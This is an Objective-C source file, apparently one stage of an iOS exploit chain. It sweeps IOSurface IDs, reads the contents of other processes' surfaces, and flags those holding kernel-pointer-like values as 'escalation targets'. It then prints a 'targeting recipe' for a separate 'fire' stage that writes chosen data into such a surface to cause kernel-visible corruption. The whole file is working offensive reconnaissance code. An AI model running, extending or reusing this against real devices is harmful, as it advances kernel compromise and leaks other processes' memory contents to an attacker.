//
//  P185SidRegistryCensus.m — the sid-registry census (the aimable-surface
//  map for the output-sid lane).
//
//  WHY (findings/2026-11-28_3072_tenant_census.md, the final redirect): the
//    marshal's aimed write (the OUTPUT record's sid -> the ANE hardware
//    writes the inference result into the named surface) can only name
//    surfaces that resolve in OUR task's IOSurfaceLookup — the wrapped
//    surface's GetID IS the armed sid. The old census (P044 3a.5) swept
//    1..1200 and found 3 foreign hits. THE OPEN QUESTIONS: (a) the WIDE
//    band (1..4096), (b) what those resolvable foreign surfaces ARE —
//    and specifically whether ANY of them is kernel-consumed (a surface
//    with kernel-band qwords / system content class = the write
//    escalation target).
//
//  WHAT IT DOES (PANIC-FREE, no ANE machinery, no fire):
//    P1  stage a batch of our own surfaces (the sid-band baseline)
//    P2  the WIDE sweep: IOSurfaceLookup(1..P185_SWEEP_MAX); every hit
//        that is not ours: GetID / AllocSize / usecount / a 64-byte
//        content sample + the kernel-band qword count
//    P3  the verdict: the AIMABLE list (foreign sids, size class, content
//        class, kernel-band hits) ranked; the kernel-consumed candidates
//        called out
//    P4  the targeting recipe: which sid to write into p044_target.txt
//        for the existing P044 fire lane (the v56/v62 round-trip gate
//        still applies — the fire's own checks decide)
//
//  NEVER sets hasKread. Log p185_sid_census_log.txt.
//

#import "P185SidRegistryCensus.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P185_BUILD @"p185-sid-registry-census-v1"
#define P185_SWEEP_MAX 4096

typedef void *(*p185_create_t)(CFDictionaryRef);
typedef uint32_t (*p185_getid_t)(IOSurfaceRef);
typedef size_t (*p185_allocsz_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p185_lookup_t)(uint32_t);
typedef int (*p185_usecount_t)(IOSurfaceRef);
typedef int (*p185_lock_t)(IOSurfaceRef, int, void *);
typedef void *(*p185_base_t)(IOSurfaceRef);

static int p185_is_kptr(uint64_t v) {
    if (!v) return 0;
    if ((v >> 36) == 0xfffffff0ULL) return 1;
    if ((v >> 32) == 0xfffffe00ULL) return 1;
    if (v >= 0xfffffe0000000000ULL && v < 0xfffffff100000000ULL) return 1;
    return 0;
}

@implementation P185SidRegistryCensus

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p185_sid_census_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p185 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P185_BUILD]);
    L(@"THE SID-REGISTRY CENSUS: which surfaces resolve in OUR task's");
    L(@"IOSurfaceLookup (the aimable set for the output-sid lane), swept");
    L(@"wide, characterized (size class / content class / kernel-band");
    L(@"qwords = the kernel-consumed candidates). PANIC-FREE, no fire.");
    L(@"NEVER sets hasKread.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    void *isf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p185_create_t  sfCreate = (p185_create_t)dlsym(isf, "IOSurfaceCreate");
    p185_getid_t   sfGetID  = (p185_getid_t)dlsym(isf, "IOSurfaceGetID");
    p185_allocsz_t sfAlloc  = (p185_allocsz_t)dlsym(isf, "IOSurfaceGetAllocSize");
    p185_lookup_t  sfLookup = (p185_lookup_t)dlsym(isf, "IOSurfaceLookup");
    p185_usecount_t sfUse   = (p185_usecount_t)dlsym(isf, "IOSurfaceGetUseCount");
    p185_lock_t    sfLock   = (p185_lock_t)dlsym(isf, "IOSurfaceLock");
    p185_base_t    sfBase   = (p185_base_t)dlsym(isf, "IOSurfaceGetBaseAddress");
    if (!sfCreate || !sfGetID || !sfLookup || !sfBase) {
        L(@"[-] IOSurface symbols unresolved -- tap void");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── P1: our own sid band ── */
    L(@"");
    L(@"=== P1: our own sid band ===");
    IOSurfaceRef ours[32];
    int nOurs = 0;
    uint32_t ourMin = 0xFFFFFFFF, ourMax = 0;
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241,
    };
    for (int i = 0; i < 32; i++) {
        IOSurfaceRef s = sfCreate((__bridge CFDictionaryRef)props);
        if (!s) continue;
        ours[nOurs++] = s;
        uint32_t sid = sfGetID(s);
        if (sid < ourMin) ourMin = sid;
        if (sid > ourMax) ourMax = sid;
    }
    L([NSString stringWithFormat:@"[P1] %d surfaces staged: sid band %u..%u "
       @"(the boot allocation watermark: sids BELOW %u include the "
       @"system-allocated set)", nOurs, ourMin, ourMax, ourMin]);

    /* ── P2: the wide sweep ── */
    L(@"");
    L([NSString stringWithFormat:@"=== P2: the wide sweep (1..%d) ===",
       P185_SWEEP_MAX]);
    int foreignN = 0, kernelBand = 0;
    uint32_t bestSid = 0;
    int bestK = 0;
    size_t bestSz = 0;
    for (uint32_t sid = 1; sid < P185_SWEEP_MAX; sid++) {
        IOSurfaceRef f = sfLookup(sid);
        if (!f) continue;
        int mine = 0;
        for (int k = 0; k < nOurs; k++) {
            if (ours[k] && sfGetID(ours[k]) == sid) { mine = 1; break; }
        }
        if (mine) continue;
        foreignN++;
        uint32_t rid = sfGetID(f);
        size_t sz = sfAlloc ? sfAlloc(f) : 0;
        int use = sfUse ? sfUse(f) : -1;
        int kp = 0;
        uint64_t firstQ = 0;
        char sampleHex[64 * 2 + 1];
        sampleHex[0] = 0;
        if (sfLock && sfBase && sfLock(f, 1, NULL) == 0) {
            uint8_t *b = (uint8_t *)sfBase(f);
            if (b) {
                for (int q = 0; q < 8; q++) {
                    uint64_t v = 0;
                    memcpy(&v, b + q * 8, 8);
                    if (q == 0) firstQ = v;
                    if (p185_is_kptr(v)) kp++;
                }
                for (int q = 0; q < 32; q++)
                    snprintf(sampleHex + q * 2, 3, "%02x", b[q]);
            }
            sfLock(f, 0, NULL);
        }
        if (kp > 0) {
            kernelBand++;
            if (kp > bestK) { bestK = kp; bestSid = sid; bestSz = sz; }
        }
        if (foreignN <= 24 || kp > 0)
            L([NSString stringWithFormat:
               @"[P2] sid=%u rt=%u sz=%#zx use=%d kptr=%d%@ first=0x%016llx",
               sid, rid, sz, use, kp,
               kp ? @"  <-- KERNEL-BAND CONTENT" : @"",
               (unsigned long long)firstQ]);
        CFRelease(f);
    }
    L([NSString stringWithFormat:
       @"[P2] sweep done: %d foreign surfaces resolved in OUR task (of "
       @"%d); %d carry kernel-band qwords", foreignN, P185_SWEEP_MAX,
       kernelBand]);

    for (int k = 0; k < nOurs; k++) if (ours[k]) CFRelease(ours[k]);

    /* ── P3/P4: the verdict + the targeting recipe ── */
    L(@"");
    L(@"=== P3: THE VERDICT ===");
    if (kernelBand > 0) {
        L([NSString stringWithFormat:
           @"[P3] *** AIMABLE KERNEL-CONSUMED CANDIDATE(S): best sid=%u "
           @"(kptr=%d/8 qwords, sz=%#zx) ***", bestSid, bestK, bestSz]);
        L(@"[P3] a kernel-band-content surface that resolves from OUR task");
        L(@"    is the output-sid lane's escalation target: the P044 fire");
        L(@"    (the existing p044_target.txt lane) writes its chosen-");
        L(@"    content inference output INTO it. If the kernel reads that");
        L(@"    surface, the write becomes a kernel-visible corruption.");
        L([NSString stringWithFormat:
           @"[P4] TARGETING RECIPE: write %u into p044_target.txt (decimal), "
           @"pick the fill tile in p044_fill.txt, stage the min model, fire "
           @"P044 -- its own round-trip gates (rt=GetID(lookup)) decide "
           @"honestly whether the aim holds.", bestSid]);
    } else if (foreignN > 0) {
        L(@"[P3] foreign surfaces resolve but none carry kernel-band");
        L(@"    content this sweep -- the aimable set is app-owned only.");
        L(@"    The v56/v62 foreign-write lane remains the receipt class");
        L(@"    (note 164's chosen-content write stands).");
    } else {
        L(@"[P3] NO foreign surfaces resolve this tap (the task-scoped");
        L(@"    law) -- the aimable set is our own surfaces only. The");
        L(@"    output-sid escalation needs the ANE-registry-side decode");
        L(@"    instead (which sids MemoryMapRequest_gated resolves).");
    }
    L(@"[=] census receipt class. NEVER hasKread.");

    [[P007Board shared] recordEvent:@"p185_sid_census"
                                 kind:@"census"
                               detail:[NSString stringWithFormat:
                                       @"foreign=%d kernelBand=%d best=%u",
                                       foreignN, kernelBand, bestSid]
                               source:@"p185"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
